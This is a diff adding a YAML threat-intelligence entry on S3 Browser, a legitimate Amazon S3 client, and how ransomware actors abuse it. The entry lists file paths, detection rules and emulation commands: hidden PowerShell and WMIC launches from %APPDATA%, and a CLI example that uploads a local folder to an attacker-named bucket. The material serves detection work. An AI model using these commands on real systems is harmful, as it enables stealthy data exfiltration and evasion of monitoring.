@@ -1,0 +1,92 @@
+Name: S3 Browser
+Description: >
+  S3 Browser is a legitimate Windows GUI client for Amazon S3, enabling users to upload, download,
+  and manage objects in cloud storage. While designed for administrative use, it has been abused
+  by ransomware and extortion actors for data exfiltration, leveraging its trusted HTTPS
+  connections to Amazon AWS. Attackers use both GUI and command-line variants, often executing
+  from non-standard paths or silently through PowerShell to avoid detection.
+Category: cloud-based
+Platform:
+  - Windows
+Execution:
+  - gui
+  - cli
+  - script
+Capabilities:
+  - cloud-sync
+  - encrypted-transfer
+  - stealth-upload
+Stealth:
+  - masquerading
+  - background-execution
+  - encrypted-transfer
+  - proxy-support
+Forensics:
+  BinaryLocations:
+    - C:\Program Files (x86)\S3 Browser\s3browser-ui.exe
+    - C:\Program Files\S3 Browser\s3browser-ui.exe
+    - C:\Program Files (x86)\S3 Browser\s3browser-cli.exe
+  ConfigFiles:
+    - C:\Users\<user>\AppData\Roaming\S3Browser\s3browser.settings.v4
+  ScheduledTask: []
+  RegistryPersistence: []
+  NetworkArtifacts:
+    - HTTPS connections to AWS S3 endpoints
+    - AWS S3 bucket uploads via CLI
+    - Presence of S3 access keys in process memory
+ThreatActors:
+  - ransomware
+  - apt
+Tags:
+  - commonly-used
+  - cloud-tool
+  - stealth
+  - persistence
+UseCases:
+  - Title: Standard GUI Upload
+    Description: >
+      Legitimate use case — manual file uploads using the S3 Browser interface.
+      Threat actors may exploit this in compromised systems with GUI access.
+    Command: |
+      "C:\Program Files\S3 Browser\s3browser-ui.exe"
+
+  - Title: Post-Exploitation GUI Execution
+    Description: >
+      Attacker copies S3 Browser binaries to a user-writable location and executes from there.
+      Indicates potential evasion of application control or tampering.
+    Command: |
+      Start-Process "$env:APPDATA\S3Tools\s3browser-ui.exe"
+
+  - Title: Hidden Execution via PowerShell
+    Description: >
+      S3 Browser is executed silently without showing the interface, simulating covert exfiltration.
+    Command: |
+      Start-Process "$env:APPDATA\S3Tools\s3browser-ui.exe" -WindowStyle Hidden
+
+  - Title: Batch Dropper Execution
+    Description: >
+      Launches S3 Browser via batch file for stealthy startup from a non-standard directory.
+    Command: |
+      @echo off
+      start "" "%APPDATA%\S3Tools\s3browser-ui.exe"
+
+  - Title: Command-Line Exfiltration
+    Description: >
+      Uses S3 Browser CLI for file uploads to AWS S3 buckets using access keys.
+    Command: |
+      s3browser-cli.exe /account add 0 "ShinyHunters-POC" access-key-id=<AKIA...> secret-access-key=<secret>
+      s3browser-cli.exe /file upload "ShinyHunters-POC" C:\Temp\img_backup shinyhunters-poc/test-cli
+
+  - Title: LOLBIN-Based Execution
+    Description: >
+      Simulates attacker launching S3 Browser via Windows Management Instrumentation (WMIC)
+      to evade process chain detections.
+    Command: |
+      wmic process call create "$env:APPDATA\S3Tools\s3browser-ui.exe"
+
+Detection:
+  - Monitor execution of s3browser-ui.exe or s3browser-cli.exe from user-writable directories such as %APPDATA%, %TEMP%, or %PUBLIC%.
+  - Alert on parent processes like PowerShell, cmd, or wmic launching S3 Browser.
+  - Watch for access to sensitive directories or AWS credentials prior to execution.
+  - Detect unexpected creation or modification of s3browser.settings.v4 outside Program Files paths.
+LastModified: 2025-10-17
